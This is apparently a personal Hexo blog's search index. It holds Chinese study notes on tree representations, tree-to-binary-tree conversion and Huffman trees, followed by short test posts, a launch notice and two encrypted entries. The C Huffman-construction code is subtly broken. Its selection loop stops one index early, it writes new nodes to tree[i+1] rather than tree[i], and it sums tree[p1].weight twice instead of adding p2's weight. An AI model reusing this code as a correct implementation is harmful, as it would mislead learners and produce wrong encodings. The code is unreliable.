id="双亲表示法"><a href="#双亲表示法" class="headerlink" title="双亲表示法"></a>双亲表示法</h5><p>采用一组连续空间存储树的结点，通过保存每个结点的双亲结点的位置，表示树中结点关系的位置结构。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">PTNode</span>&#123;</span><br><span class="line">    TElemType data;</span><br><span class="line">    <span class="type">int</span> parent;</span><br><span class="line">&#125;PTNode;</span><br></pre></td></tr></table></figure><h5 id="孩子链表表示法"><a href="#孩子链表表示法" class="headerlink" title="孩子链表表示法"></a>孩子链表表示法</h5><p>对树的每个结点用线性链表存储它的孩子结点。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">CTNode</span>&#123;</span><br><span class="line">  <span class="type">int</span> child;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">CTNode</span> *next;</span><br><span class="line">&#125;*ChildPtr;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>&#123;</span><br><span class="line">    TElemType data;</span><br><span class="line">  <span class="type">int</span> parent;</span><br><span class="line">    ChildPtr firstchild;</span><br><span class="line">&#125;CTBox;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>&#123;</span><br><span class="line">  CTBox nodes[MAX];</span><br><span class="line">  <span class="type">int</span> n,r;</span><br><span class="line">&#125;CTree;</span><br></pre></td></tr></table></figure><h5 id="带双亲的孩子链表表示法"><a href="#带双亲的孩子链表表示法" class="headerlink" title="带双亲的孩子链表表示法"></a>带双亲的孩子链表表示法</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">CTNode</span>&#123;</span><br><span class="line">  <span class="type">int</span> child;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">CTNode</span> *next;</span><br><span class="line">&#125;*ChildPtr;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>&#123;</span><br><span class="line">    TElemType data;</span><br><span class="line">  <span class="type">int</span> parent;</span><br><span class="line">    ChildPtr firstchild;</span><br><span class="line">&#125;CTBox;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>&#123;</span><br><span class="line">  CTBox nodes[MAX];</span><br><span class="line">  <span class="type">int</span> n,r;</span><br><span class="line">&#125;CTree;</span><br></pre></td></tr></table></figure><h5 id="孩子兄弟表示法"><a href="#孩子兄弟表示法" class="headerlink" title="孩子兄弟表示法"></a>孩子兄弟表示法</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">CSNode</span>&#123;</span><br><span class="line">    TElemType data;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">CSNode</span> *firstchild,*firstbrother;</span><br><span class="line">&#125;CSNode,*CSTree;</span><br></pre></td></tr></table></figure><h4 id="树、森林与二叉树的转化"><a href="#树、森林与二叉树的转化" class="headerlink" title="树、森林与二叉树的转化"></a>树、森林与二叉树的转化</h4><h5 id="树到二叉树"><a href="#树到二叉树" class="headerlink" title="树到二叉树"></a>树到二叉树</h5><p>1)在所有兄弟结点之间加一条连线。</p><p>2)对每个结点，除了保留与其长子的连线外，去掉该结点与其他孩子的连线。</p><h5 id="森林到二叉树"><a href="#森林到二叉树" class="headerlink" title="森林到二叉树"></a>森林到二叉树</h5><p>1)将森林中的每一棵树转化为二叉树</p><p>2)将各二叉树的根结点视为兄弟连在一起</p><h4 id="树的遍历-1"><a href="#树的遍历-1" class="headerlink" title="树的遍历"></a>树的遍历</h4><p>一般不中序遍历</p><p>两条路径：从左到右、从上到下</p><p><strong>树的前序遍历</strong>与转换成<strong>二叉树的前序遍历</strong>相同</p><p><strong>树的后序遍历</strong>与转换成<strong>二叉树的中序遍历</strong>相同</p><h3 id="赫夫曼树及其应用"><a href="#赫夫曼树及其应用" class="headerlink" title="赫夫曼树及其应用"></a>赫夫曼树及其应用</h3><p>基本概念</p><p>路径长度：路径上边的个数</p><p>树的路径长度：从根结点出发，到所有结点的路径长度之和</p><p>结点的带权路径长度：结点到根结点的长度与权重的乘积</p><p>树的带权路径长度：所有叶子结点的带权路径长度之和</p><h4 id="赫夫曼树的定义"><a href="#赫夫曼树的定义" class="headerlink" title="赫夫曼树的定义"></a>赫夫曼树的定义</h4><p>最优二叉树，给定叶结点权重，具有最小带权路径长度的二叉树。</p><h4 id="构造赫夫曼树-赫夫曼算法"><a href="#构造赫夫曼树-赫夫曼算法" class="headerlink" title="构造赫夫曼树(赫夫曼算法)"></a>构造赫夫曼树(赫夫曼算法)</h4><p>基本思想：使权值大的叶子结点尽量靠近根节点，而使权值小的叶子结点尽量远离根结点</p><p>将给定的一些叶子结点中取出两个最小的叶子作为一个结点的左孩子和右孩子，然后将它们的权值相加，从剩下的叶子中寻找最小的结点作为上面结点的兄弟，重复此操作。</p><p>n个叶结点，按上述操作，构造的树中含有2n-1个结点。</p><p><img src="/2023/11/14/赫夫曼树构造.png" alt="image4"></p><p>huffman算法实现：</p><p>主函数先给n，m赋值。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">    <span class="type">float</span> weight;</span><br><span class="line">    <span class="type">int</span> lch,rch,parent;</span><br><span class="line">&#125;hufmtree;</span><br><span class="line"><span class="type">int</span> n,m;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CreateHuffmanTree</span><span class="params">(hufmtree tree[])</span></span>&#123;<span class="comment">//初始化</span></span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;m;i++)&#123;</span><br><span class="line">        tree[i].weight=<span class="number">0.0</span>;</span><br><span class="line">        tree[i].lch=<span class="number">-1</span>;</span><br><span class="line">        tree[i].rch=<span class="number">-1</span>;</span><br><span class="line">        tree[i].parent=<span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InputWeight</span><span class="params">(hufmtree tree[])</span></span>&#123;</span><br><span class="line">    <span class="type">float</span> w;</span><br><span class="line">    <span class="type">float</span> small1,small2,f;</span><br><span class="line">    <span class="type">int</span> i,j,p1,p2;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n输入第%d个权值:&quot;</span>,i+<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%f&quot;</span>,&amp;w);</span><br><span class="line">        tree[i].weight=w;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i=n;i&lt;m;i++)&#123;<span class="comment">//把合并后的结点放入n～m向量</span></span><br><span class="line">        p1=<span class="number">0</span>;p2=<span class="number">0</span>;    <span class="comment">//两个根结点在tree中的下标</span></span><br><span class="line">        small1=MAXFLOAT;<span class="comment">//MAXFLOAT为最大浮点数</span></span><br><span class="line">        small2=MAXFLOAT;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;i<span class="number">-1</span>;j++)&#123;<span class="comment">//选择两个最小的权</span></span><br><span class="line">            <span class="keyword">if</span>(tree[j].parent==<span class="number">-1</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(tree[j].weight&lt;small1)&#123;</span><br><span class="line">                    small2=small1;<span class="comment">//更新最小权，次小权，及其位置</span></span><br><span class="line">                    small1=tree[j].weight;<span class="comment">//找出最小权</span></span><br><span class="line">                    p2=p1;</span><br><span class="line">                    p1=j;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(tree[j].weight&lt;small2)&#123;</span><br><span class="line">                    small2=tree[j].weight;<span class="comment">//改变次小权及位置</span></span><br><span class="line">                    p2=j;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        tree[p1].parent=i+<span class="number">1</span>;</span><br><span class="line">        tree[p2].parent=i+<span class="number">1</span>;</span><br><span class="line">      <span class="comment">//将新生成的结点放在tree[i+1]</span></span><br><span class="line">        tree[i+<span class="number">1</span>].lch=p1;</span><br><span class="line">        tree[i+<span class="number">1</span>].rch=p2;</span><br><span class="line">        tree[i+<span class="number">1</span>].weight=tree[p1].weight+tree[p1].weight;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="赫夫曼编码"><a href="#赫夫曼编码" class="headerlink" title="赫夫曼编码"></a>赫夫曼编码</h4><p>1)首先构造出赫夫曼树</p><p>2)每个结点的左分支计0 右分支计1，从根结点到叶子结点的沿途路径分支组成的01代码串即赫夫曼编码</p>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>个人博客基本部署成功！</title>
      <link href="/2023/11/09/"/>
      <url>/2023/11/09/</url>
      
        <content type="html"><![CDATA[<p>11.09日我的博客基本部署成功了，有一些基本的美化功能（借鉴各路大佬）<br>接下来预计将会逐步完善各项功能，留言板已开，可以多多留言<br>预计接下来会发布内容关于：<br>1.ctf题目/工具解答 本人misc做的多点，预计一个月内发布一篇misc工具合集介绍。<br>2.学校的课程内容，主要是为了复习+记录。<br>3.个人日常板块还没做，迟早会发。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>a basic test</title>
      <link href="/2023/11/09/"/>
      <url>/2023/11/09/</url>
      
        <content type="html"><![CDATA[<p>test test tes</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>今日测试</title>
      <link href="/2023/11/09/"/>
      <url>/2023/11/09/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="314b778ccd1012cad8846435536f091270f2b36b97591be73fd3ae3f00163cdd">10d79030e8222445804370796b90fca18d3af0ca0aed65002f2d27e5161276f9a34ce6f47914fa2d3c77a4530036ebbf49392c613893bc04a4747ee94fb4d5f88c16dc93152c4f00c0ef25a2ae27d29cd3b7a1c8f2dba4224c6e826413ea97a1</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>work_12.11</title>
      <link href="/2023/11/09/"/>
      <url>/2023/11/09/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="4237b5ab9b62ff40e91ec2f2339630465adbd8b2917c54802b887802653cdc78">01c5434afc057ec70c0b06aa0591fac6feaac8ea76c74c2a16a82314c7311e3d7a8f6737cf7b5c9038c6896dbf539075414845885f166cbc4c60fc4e2685be30b483fc1b39384fa2edc582211d27467ff62aac53660ebd6b7cbe4aff2b8872e220eb40bd790ff5838c8e22b6a2b2e12cafa1ba3d29e51f2b55cbeab4c022e21298cf2583bbf44aa28cd5bb30cdc842aa07134361303d2e403741d7cee9bc62af</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">需要密码！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>test4blog</title>
      <link href="/2023/11/08/"/>
      <url>/2023/11/08/</url>
      
        <content type="html"><![CDATA[<p>This is a test for lincoxi to test if his blog works ok.</p><p>My github account is cyan4run. It’s easy to recongnize.</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
